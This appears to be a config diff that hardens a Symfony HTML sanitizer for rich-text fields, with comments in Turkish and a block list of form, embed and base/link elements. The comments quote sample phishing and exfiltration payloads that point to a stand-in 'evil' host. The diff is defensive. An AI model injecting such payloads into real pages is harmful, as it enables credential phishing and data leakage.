@@ -6,13 +6,77 @@ framework:
             # aggressively sanitized using symfony/html-sanitizer before
             # saving"). Node modülünden bağımsız, generic bir sanitizer —
             # herhangi bir Node type'ında rich-text alanı olan modül kullanabilir.
+            #
+            # Kullananlar: Blog gövdesi (PostAdminController::mapDtoToNode),
+            # profil biyografisi (AACPUserController::mapProfileDtoToUser),
+            # forum gönderisi (ForumTopicService::sanitizeBody) ve Roadmap
+            # gövdesi (RoadmapEntryAdminController::sanitizeBody).
             cpalius_richtext:
                 allow_safe_elements: true
                 allow_static_elements: true
                 allow_elements:
                     img: ['src', 'alt', 'width', 'height', 'class']
                     a: ['href', 'title', 'target', 'rel']
+                    blockquote: ['data-post', 'class']
                 allow_attributes:
                     class: '*'
+                    data-post: ['blockquote']
+
+                # ─────────────────────────────────────────────────────────
+                # SERTLEŞTİRME (FAZ 1 doğrulaması sırasında bulundu)
+                # ─────────────────────────────────────────────────────────
+                # allow_static_elements, Symfony'nin "script çalıştırmayan"
+                # olarak sınıflandırdığı geniş bir eleman kümesini açar.
+                # Bu sınıflandırma SCRIPT güvenliği içindir, KİMLİK AVI
+                # güvenliği için değil — ve gerçek payload'larla test
+                # edildiğinde iki vektörün geçtiği görüldü:
+                #
+                #   <form action="//evil"><input type="password"> ...
+                #     Sayfaya gömülü bir form, tarayıcının şifre
+                #     yöneticisini tetikleyebilir ve girilen veriyi
+                #     saldırganın sunucusuna POST eder. Blog yazısı, forum
+                #     gönderisi veya profil biyografisi içine gömülebildiği
+                #     için gerçek bir kimlik avı yüzeyidir.
+                #
+                #   <div style="position:fixed;width:100%;height:100%">
+                #     Tam ekran kaplama ile arayüz yanıltma (UI redressing);
+                #     background-image: url(//evil/?...) ile veri sızdırma.
+                #     (url(javascript:) modern tarayıcılarda ÇALIŞMAZ —
+                #     tehdit script değil, düzen ve gizlilik ihlalidir.)
+                #
+                # block_elements, etiketi kaldırır ama İÇİNDEKİ METNİ
+                # KORUR — kullanıcının yazdığı görünür içerik kaybolmaz,
+                # yalnızca etkileşimli/tehlikeli kabuk düşer.
+                block_elements:
+                    # Kimlik avı yüzeyi
+                    - form
+                    - input
+                    - button
+                    - select
+                    - option
+                    - optgroup
+                    - textarea
+                    - label
+                    - fieldset
+                    - legend
+                    - datalist
+                    - output
+                    # Gömülü/harici içerik yükleyiciler
+                    - object
+                    - embed
+                    - applet
+                    - param
+                    # Belge bağlamını ele geçirenler: <base> sayfadaki TÜM
+                    # göreli linkleri saldırganın alan adına yönlendirir,
+                    # <link> harici stil sayfası yükler.
+                    - base
+                    - link
+
+                # "style" özniteliği hiçbir zengin metin alanında meşru bir
+                # ihtiyaç değildir: görsel biçimlendirme "class" üzerinden
+                # (yukarıda '*' ile serbest) tema CSS'ine bırakılır.
+                drop_attributes:
+                    style: '*'
+
                 allowed_link_schemes: ['http', 'https']
                 allow_relative_links: true
